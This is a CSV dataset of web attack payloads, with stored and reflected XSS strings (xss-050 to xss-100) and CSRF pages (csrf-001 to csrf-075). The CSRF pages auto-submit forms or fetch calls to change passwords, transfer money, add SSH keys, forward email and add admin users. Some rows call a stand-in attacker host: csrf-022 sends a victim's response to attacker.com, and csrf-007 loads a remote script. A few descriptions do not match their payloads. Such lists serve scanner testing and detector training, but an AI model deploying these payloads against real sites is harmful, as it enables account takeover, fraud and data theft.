id,attack_class,payload,type,severity,context,description,example
xss-050,xss,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",stored,high,User input field,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,xss,"<script>setInterval(function(){alert('XSS51')},1000)</script>",reflected,high,URL parameter,Reflected XSS using script tag with setInterval,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,xss,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",stored,high,User input field,Stored XSS using iframe with onload and srcdoc,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,xss,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",reflected,high,URL parameter,Reflected XSS using svg with onload and script tag,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,xss,"<iframe src='javascript:alert(""XSS54"")'></iframe>",stored,high,User input field,Stored XSS using iframe with src set to javascript URI,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,xss,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",reflected,high,URL parameter,Reflected XSS using object tag with type attribute and data URI,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,xss,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",stored,high,User input field,Stored XSS using svg with onload and setTimeout,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,xss,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with srcdoc and encoded script,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,xss,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",stored,high,User input field,Stored XSS using svg with animateTransform and onbegin event,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,xss,"<script>Function('alert(""XSS59"")')()</script>",reflected,high,URL parameter,Reflected XSS using script tag with Function constructor,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-060,xss,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",stored,high,User input field,Stored XSS using iframe with onload and encoded srcdoc,"User input: <iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
xss-061,xss,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,reflected,high,URL parameter,Reflected XSS using SVG with feImage and onload event,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,xss,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",stored,high,User input field,Stored XSS using details tag with ontoggle event and script,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,xss,"<math href='javascript:alert(""XSS63"")'>X</math>",reflected,high,URL parameter,Reflected XSS using math tag with href attribute and javascript URI,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,xss,"<audio src='x' onerror='alert(""XSS64"")'></audio>",stored,high,User input field,Stored XSS using audio tag with onerror event,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,xss,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with srcdoc and onload event,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,xss,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",stored,high,User input field,Stored XSS using svg with animateMotion and onbegin event,"User input: <svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,xss,"<input oninvalid='alert(""XSS67"")' required>",reflected,high,URL parameter,Reflected XSS using input tag with oninvalid event,"http://example.com/page?param=<input oninvalid='alert(""XSS67"")' required>"
xss-068,xss,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",stored,high,User input field,Stored XSS using iframe with allow attribute and srcdoc,"User input: <iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,xss,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onfocusin event,"http://example.com/page?param=<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,xss,"<video onpause='alert(""XSS70"")'></video>",stored,high,User input field,Stored XSS using video tag with onpause event,"User input: <video onpause='alert(""XSS70"")'></video>"
xss-071,xss,"<svg onmouseenter='alert(""XSS71"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onmouseenter event,"http://example.com/page?param=<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,xss,"<form oninput='alert(""XSS72"")'><input></form>",stored,high,User input field,Stored XSS using form tag with oninput event,"User input: <form oninput='alert(""XSS72"")'><input></form>"
xss-073,xss,"<svg onwheel='alert(""XSS73"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onwheel event,"http://example.com/page?param=<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,xss,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",stored,high,User input field,Stored XSS using iframe with allowfullscreen attribute and onload event,"User input: <iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,xss,"<svg onanimationend='alert(""XSS75"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onanimationend event,"http://example.com/page?param=<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,xss,"<audio onplay='alert(""XSS76"")'></audio>",stored,high,User input field,Stored XSS using audio tag with onplay event,"User input: <audio onplay='alert(""XSS76"")'></audio>"
xss-077,xss,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onscroll event,"http://example.com/page?param=<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,xss,"<iframe seamless onload='alert(""XSS78"")'></iframe>",stored,high,User input field,Stored XSS using iframe with seamless attribute and onload event,"User input: <iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,xss,"<svg oncut='alert(""XSS79"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with oncut event,"http://example.com/page?param=<svg oncut='alert(""XSS79"")'></svg>"
xss-080,xss,"<svg oncopy='alert(""XSS80"")'></svg>",stored,high,User input field,Stored XSS using svg with oncopy event,"User input: <svg oncopy='alert(""XSS80"")'></svg>"
xss-081,xss,"<svg onpaste='alert(""XSS81"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpaste event,"http://example.com/page?param=<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,xss,"<svg onreset='alert(""XSS82"")'></svg>",stored,high,User input field,Stored XSS using svg with onreset event,"User input: <svg onreset='alert(""XSS82"")'></svg>"
xss-083,xss,"<svg onsearch='alert(""XSS83"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onsearch event,"http://example.com/page?param=<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,xss,"<svg onselect='alert(""XSS84"")'></svg>",stored,high,User input field,Stored XSS using svg with onselect event,"User input: <svg onselect='alert(""XSS84"")'></svg>"
xss-085,xss,"<svg onshow='alert(""XSS85"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onshow event,"http://example.com/page?param=<svg onshow='alert(""XSS85"")'></svg>"
xss-086,xss,"<svg ontoggle='alert(""XSS86"")'></svg>",stored,high,User input field,Stored XSS using svg with ontoggle event,"User input: <svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,xss,"<svg ontransitionend='alert(""XSS87"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with ontransitionend event,"http://example.com/page?param=<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,xss,"<svg onunload='alert(""XSS88"")'></svg>",stored,high,User input field,Stored XSS using svg with onunload event,"User input: <svg onunload='alert(""XSS88"")'></svg>"
xss-089,xss,"<svg onvolumechange='alert(""XSS89"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onvolumechange event,"http://example.com/page?param=<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,xss,"<svg onwaiting='alert(""XSS90"")'></svg>",stored,high,User input field,Stored XSS using svg with onwaiting event,"User input: <svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,xss,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onwheel event and CSS animation,"http://example.com/page?param=<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,xss,"<svg onpointercancel='alert(""XSS92"")'></svg>",stored,high,User input field,Stored XSS using svg with onpointercancel event,"User input: <svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,xss,"<svg onpointerout='alert(""XSS93"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpointerout event,"http://example.com/page?param=<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,xss,"<svg onpointerover='alert(""XSS94"")'></svg>",stored,high,User input field,Stored XSS using svg with onpointerover event,"User input: <svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,xss,"<svg onpointerup='alert(""XSS95"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onpointerup event,"http://example.com/page?param=<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,xss,"<svg onselectstart='alert(""XSS96"")'></svg>",stored,high,User input field,Stored XSS using svg with onselectstart event,"User input: <svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,xss,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onshow event and tabindex,"http://example.com/page?param=<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,xss,"<svg onstalled='alert(""XSS98"")'></svg>",stored,high,User input field,Stored XSS using svg with onstalled event,"User input: <svg onstalled='alert(""XSS98"")'></svg>"
xss-099,xss,"<svg onsubmit='alert(""XSS99"")'></svg>",reflected,high,URL parameter,Reflected XSS using svg with onsubmit event,"http://example.com/page?param=<svg onsubmit='alert(""XSS99"")'></svg>"
xss-100,xss,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>",stored,high,User input field,Stored XSS using svg with onunload event and script,"User input: <svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>"
csrf-001,csrf,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,CSRF,high,Malicious webpage,CSRF using auto-submitting hidden form with POST method,Embed this form in a malicious page to auto-submit password change.
csrf-002,csrf,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,CSRF,medium,Malicious webpage,CSRF using image tag with GET request,Trigger account deletion via GET request.
csrf-003,csrf,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",CSRF,high,Malicious webpage,CSRF using XMLHttpRequest with credentials,Perform unauthorized money transfer.
csrf-004,csrf,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",CSRF,high,Malicious webpage,CSRF using fetch API with credentials,Change victim's email address.
csrf-005,csrf,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,CSRF,medium,Malicious webpage,CSRF using auto-submitting form with file upload,Upload malicious avatar file.
csrf-006,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh redirect with GET request,Subscribe victim to premium plan.
csrf-007,csrf,<script src='https://attacker.com/csrf-trigger.js'></script>,CSRF,high,Malicious webpage,CSRF using script tag to load external script triggering action,Load external script that performs CSRF.
csrf-008,csrf,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",CSRF,high,Malicious webpage,CSRF using iframe with auto-submitting form inside,Change user settings silently.
csrf-009,csrf,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,CSRF,high,Malicious webpage,CSRF using SVG with embedded script and form submission,Trigger delete API call.
csrf-010,csrf,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",CSRF,medium,Malicious webpage,CSRF using beacon API to send POST request,Send data to target endpoint.
csrf-011,csrf,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event to modify data,Modify data before submission.
csrf-012,csrf,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",CSRF,high,Malicious webpage,CSRF using image with onerror event to trigger XMLHttpRequest,Like a post on victim's behalf.
csrf-013,csrf,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with hidden inputs and auto-submit,Transfer money silently.
csrf-014,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",CSRF,high,Malicious webpage,CSRF using fetch with POST and custom headers,Attempt to bypass CSRF token.
csrf-015,csrf,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with enctype multipart/form-data,Upload file without user consent.
csrf-016,csrf,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",CSRF,high,Malicious webpage,CSRF using script with setTimeout to delay request,Delayed delete request.
csrf-017,csrf,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with target iframe to hide submission,Change settings silently.
csrf-018,csrf,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with GET method and auto-submit,Send friend request without user consent.
csrf-019,csrf,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using meta refresh with POST form submission via JavaScript,Subscribe victim to premium plan.
csrf-020,csrf,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>",CSRF,medium,Malicious webpage,CSRF using script with navigator.sendBeacon to send data,Send tracking data or trigger action.
csrf-021,csrf,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",CSRF,high,Malicious webpage,CSRF using stealth iframe with delayed form submission,
csrf-022,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>",CSRF,critical,Malicious webpage,CSRF using fetch with chained promises to exfiltrate response,
csrf-023,csrf,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with multiple hidden inputs and auto-submit,
csrf-024,csrf,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">",CSRF,high,Malicious webpage,CSRF using image with onload event triggering XMLHttpRequest,
csrf-026,csrf,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>",CSRF,medium,Malicious webpage,CSRF using beacon API with custom payload,
csrf-027,csrf,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Malicious webpage,CSRF using form with enctype multipart/form-data and auto-submit,
csrf-028,csrf,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>",CSRF,high,Malicious webpage,CSRF using iframe with srcdoc containing auto-submitting form,
csrf-029,csrf,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>",CSRF,high,Malicious webpage,CSRF using script with setTimeout to chain multiple requests,
csrf-030,csrf,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Malicious webpage,CSRF using form with target iframe and hidden inputs,
csrf-031,csrf,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>",CSRF,high,Malicious webpage,CSRF using fetch with spoofed headers (may bypass naive CSRF tokens),
csrf-032,csrf,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event modifying data,
csrf-033,csrf,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">",CSRF,high,Malicious webpage,CSRF using image with onerror event triggering fetch,
csrf-034,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh to redirect to GET endpoint,
csrf-035,csrf,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>,CSRF,critical,Malicious webpage,CSRF using script to create and submit form dynamically,
csrf-036,csrf,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with JSON payload (if API accepts),
csrf-037,csrf,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>",CSRF,high,Malicious webpage,CSRF using form with multiple steps and chained submissions,
csrf-040,csrf,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>",CSRF,high,Malicious webpage,CSRF using form with hidden iframe and delayed submission,
csrf-041,csrf,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>",CSRF,high,Malicious webpage,CSRF using script to create image with onload triggering fetch,
csrf-042,csrf,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>",CSRF,high,Malicious webpage,CSRF using form with multiple hidden inputs and chained submission,
csrf-043,csrf,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with custom headers and JSON body,
csrf-044,csrf,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>",CSRF,high,Malicious webpage,CSRF using form with onsubmit event to modify hidden input,
csrf-045,csrf,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">",CSRF,high,Malicious webpage,CSRF using image with onerror event to trigger XMLHttpRequest,
csrf-046,csrf,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>,CSRF,medium,Malicious webpage,CSRF using meta refresh to redirect to sensitive GET endpoint,
csrf-047,csrf,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>",CSRF,critical,Malicious webpage,CSRF using script to dynamically create and submit form with delay,
csrf-048,csrf,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>",CSRF,high,Malicious webpage,CSRF using fetch with JSON body and credentials,
csrf-049,csrf,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>",CSRF,high,Malicious webpage,CSRF using chained form submissions with timeouts,
csrf-051,csrf,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Admin panel user management,CSRF to add admin user via hidden form,
csrf-052,csrf,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Email service user settings,CSRF to change email notification settings,
csrf-053,csrf,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>,CSRF,high,Security 2FA reset endpoint,CSRF to reset 2FA via GET request,
csrf-054,csrf,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>,CSRF,medium,Streaming service subscription,CSRF to subscribe victim to premium service,
csrf-055,csrf,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,E-commerce user profile,CSRF to change victim's shipping address,
csrf-056,csrf,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media friend management,CSRF to add attacker as friend,
csrf-057,csrf,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Blog comment submission,CSRF to post malicious comment,
csrf-058,csrf,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media profile update,CSRF to change victim's profile picture,
csrf-059,csrf,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Online banking transfer,CSRF to initiate money transfer,
csrf-060,csrf,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Security settings,CSRF to disable security alerts,
csrf-061,csrf,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>,CSRF,critical,User account management,CSRF to change victim's password,
csrf-062,csrf,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Continuous Integration webhook settings,CSRF to add malicious webhook URL,
csrf-063,csrf,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Calendar application settings,CSRF to change victim's timezone,
csrf-064,csrf,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Email forwarding settings,CSRF to enable auto-forwarding of emails,
csrf-065,csrf,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,critical,Git hosting service SSH keys,CSRF to add malicious SSH key,
csrf-066,csrf,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,User interface settings,CSRF to change victim's language preference,
csrf-067,csrf,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>,CSRF,low,Newsletter subscription,CSRF to add victim to attacker's mailing list,
csrf-068,csrf,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Social media posting,CSRF to post malicious tweet,
csrf-069,csrf,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,SMS spam management,CSRF to add victim's phone number to spam list,
csrf-070,csrf,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Payment gateway account settings,CSRF to change victim's default payment method,
csrf-071,csrf,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Code review platform settings,CSRF to enable auto-approve on code reviews,
csrf-072,csrf,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,IoT device management,CSRF to add victim's device to attacker's monitoring,
csrf-073,csrf,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>,CSRF,medium,Calendar event management,CSRF to change victim's calendar event,
csrf-074,csrf,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,Firewall management,CSRF to add victim's IP to blacklist,
csrf-075,csrf,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>,CSRF,high,DNS management,CSRF to change victim's DNS settings,
